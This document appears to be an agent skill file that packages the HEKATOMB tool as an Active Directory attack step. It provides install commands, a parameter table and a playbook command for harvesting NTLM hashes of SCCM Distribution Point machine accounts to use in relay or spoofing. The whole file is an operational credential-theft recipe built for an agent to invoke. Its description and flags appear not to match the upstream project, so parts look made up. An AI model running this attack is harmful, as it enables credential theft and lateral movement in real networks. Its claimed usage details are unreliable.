---
name: hekatomb-dp-secret
description: "HEKATOMB steals SCCM DP machine account hashes. Signals: AD attack, domain pentest, auto find domain controller, attack all DPs, specify single DP."
zh-signals: "HEKATOMB: SCCM DP 机器账户哈希窃取。信号:ad攻击,域渗透,自动找域控,打全部 DP,指定单个 DP。"
when-to-use: >-
  Use during SCCM or AD attacks when you have valid domain credentials and want
  to harvest NTLM hashes of SCCM Distribution Point machine accounts for relay
  or spoofing.
---

# HEKATOMB

- Attack Category: C30 AD and Lateral Movement
- Upstream Repository: https://github.com/ProcessusT/HEKATOMB
- Upstream License: GPL-3.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/ProcessusT/HEKATOMB && cd HEKATOMB && pip install -r requirements.txt
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `python3 hekatomb.py -u svc -p pass -d corp.local -dc-ip 10.0.0.1` | Harvest DP shared machine account NTLM hashes |
| `-dnscorp` | Auto-discover the domain controller |
| `-all` | Hit all DPs |
| `-k 10.0.0.5` | Target a single DP |

## Attack Scenario Playbook

### SCCM DP machine account hash theft

```bash
python3 hekatomb.py -u svc -p pass -d corp.local -dc-ip 10.0.0.1
# Obtain the DP machine account NTLM hash → usable for sAMAccountName spoofing or relay material
```

## Notes

Specializes in stealing NTLM hashes of SCCM Distribution Point (DP) machine accounts, a key link in the SCCM attack chain.
